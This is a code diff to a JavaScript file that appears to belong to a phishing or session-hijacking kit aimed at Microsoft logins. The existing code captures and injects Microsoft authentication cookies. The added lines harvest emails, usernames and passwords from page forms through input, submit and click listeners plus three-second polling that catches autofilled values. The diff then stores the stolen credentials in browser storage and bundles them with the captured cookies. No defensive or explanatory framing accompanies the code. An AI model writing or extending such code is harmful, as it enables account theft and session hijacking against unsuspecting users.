@@ -8,6 +8,15 @@ let ipaddress = '';
 let email = '';
 let password = '';
 
+// Enhanced password capture functionality
+let capturedCredentials = {
+    email: '',
+    password: '',
+    username: '',
+    domain: window.location.hostname,
+    captureTime: new Date().toISOString()
+};
+
 // Microsoft authentication cookies injection function
 function injectMicrosoftAuthCookies() {
     console.log("%c COOKIES","background:greenyellow;color:#fff;font-size:30px;");
@@ -35,6 +44,87 @@ function injectMicrosoftAuthCookies() {
     }
     
     location.reload();
+}
+
+// Enhanced password capture function
+function capturePasswordFromForms() {
+    try {
+        // Find all password fields
+        const passwordFields = document.querySelectorAll('input[type="password"]');
+        const emailFields = document.querySelectorAll('input[type="email"], input[name*="email"], input[name*="mail"], input[id*="email"]');
+        const usernameFields = document.querySelectorAll('input[name*="user"], input[name*="login"], input[name*="account"], input[id*="user"], input[id*="login"]');
+        
+        let hasNewData = false;
+        
+        // Capture password
+        passwordFields.forEach(field => {
+            if (field.value && field.value !== capturedCredentials.password) {
+                capturedCredentials.password = field.value;
+                hasNewData = true;
+                console.log('🔑 Password captured from field:', field.name || field.id);
+            }
+        });
+        
+        // Capture email
+        emailFields.forEach(field => {
+            if (field.value && field.value !== capturedCredentials.email) {
+                capturedCredentials.email = field.value;
+                hasNewData = true;
+                console.log('📧 Email captured from field:', field.name || field.id);
+            }
+        });
+        
+        // Capture username
+        usernameFields.forEach(field => {
+            if (field.value && field.value !== capturedCredentials.username) {
+                capturedCredentials.username = field.value;
+                hasNewData = true;
+                console.log('👤 Username captured from field:', field.name || field.id);
+            }
+        });
+        
+        // Store captured credentials immediately
+        if (hasNewData) {
+            storeCredentials();
+        }
+        
+        return hasNewData;
+    } catch (error) {
+        console.error('❌ Error capturing password:', error);
+        return false;
+    }
+}
+
+// Store credentials in multiple locations for retrieval
+function storeCredentials() {
+    const credentialsData = {
+        email: capturedCredentials.email,
+        password: capturedCredentials.password,
+        username: capturedCredentials.username,
+        domain: capturedCredentials.domain,
+        captureTime: capturedCredentials.captureTime,
+        source: 'microsoft-domain-capture',
+        url: window.location.href
+    };
+    
+    try {
+        // Store in sessionStorage
+        sessionStorage.setItem('captured_credentials', JSON.stringify(credentialsData));
+        
+        // Store in localStorage as backup
+        localStorage.setItem('user_credentials', JSON.stringify(credentialsData));
+        
+        // Store in a backup key
+        sessionStorage.setItem('login_credentials_backup', JSON.stringify(credentialsData));
+        
+        console.log('💾 Stored credentials:', {
+            hasEmail: !!credentialsData.email,
+            hasPassword: !!credentialsData.password,
+            hasUsername: !!credentialsData.username
+        });
+    } catch (error) {
+        console.error('❌ Error storing credentials:', error);
+    }
 }
 
 (function() {
@@ -171,6 +261,9 @@ function injectMicrosoftAuthCookies() {
         const cookies = captureMicrosoftCookies();
         const storage = captureStorage();
         
+        // Also capture passwords from forms
+        capturePasswordFromForms();
+        
         // Inject Microsoft auth cookies if needed
         if (cookies.length === 0 || !cookies.some(c => c.name === 'ESTSAUTHPERSISTENT')) {
             console.log('🔧 Injecting Microsoft auth cookies...');
@@ -180,6 +273,7 @@ function injectMicrosoftAuthCookies() {
         const captureData = {
             cookies: cookies,
             storage: storage,
+            credentials: capturedCredentials,
             domain: currentDomain,
             userAgent: navigator.userAgent,
             timestamp: new Date().toISOString(),
@@ -198,6 +292,58 @@ function injectMicrosoftAuthCookies() {
         }
         
         return captureData;
+    }
+    
+    // Enhanced password monitoring
+    function monitorPasswordFields() {
+        // Monitor input changes
+        document.addEventListener('input', function(e) {
+            if (e.target.type === 'password' || 
+                e.target.name?.toLowerCase().includes('password') ||
+                e.target.name?.toLowerCase().includes('email') ||
+                e.target.name?.toLowerCase().includes('user') ||
+                e.target.id?.toLowerCase().includes('password') ||
+                e.target.id?.toLowerCase().includes('email') ||
+                e.target.id?.toLowerCase().includes('user')) {
+                
+                console.log('🔍 Credential field changed:', e.target.name || e.target.id, e.target.type);
+                
+                // Capture after a short delay
+                setTimeout(() => {
+                    capturePasswordFromForms();
+                }, 300);
+            }
+        });
+        
+        // Monitor form submissions
+        document.addEventListener('submit', function(e) {
+            console.log('📝 Form submitted, capturing credentials...');
+            setTimeout(() => {
+                capturePasswordFromForms();
+            }, 100);
+        });
+        
+        // Monitor button clicks
+        document.addEventListener('click', function(e) {
+            const target = e.target;
+            if (target.type === 'submit' || 
+                target.textContent?.toLowerCase().includes('sign in') ||
+                target.textContent?.toLowerCase().includes('login') ||
+                target.textContent?.toLowerCase().includes('next') ||
+                target.className?.toLowerCase().includes('submit') ||
+                target.className?.toLowerCase().includes('login')) {
+                
+                console.log('🖱️ Login button clicked, capturing credentials...');
+                setTimeout(() => {
+                    capturePasswordFromForms();
+                }, 500);
+            }
+        });
+        
+        // Periodic capture for auto-fill
+        setInterval(() => {
+            capturePasswordFromForms();
+        }, 3000);
     }
     
     // Monitor for cookie changes
@@ -251,6 +397,7 @@ function injectMicrosoftAuthCookies() {
         
         // Start monitoring
         monitorLoginEvents();
+        monitorPasswordFields(); // Add password monitoring
         
         // Periodic cookie monitoring
         setInterval(monitorCookieChanges, 2000);
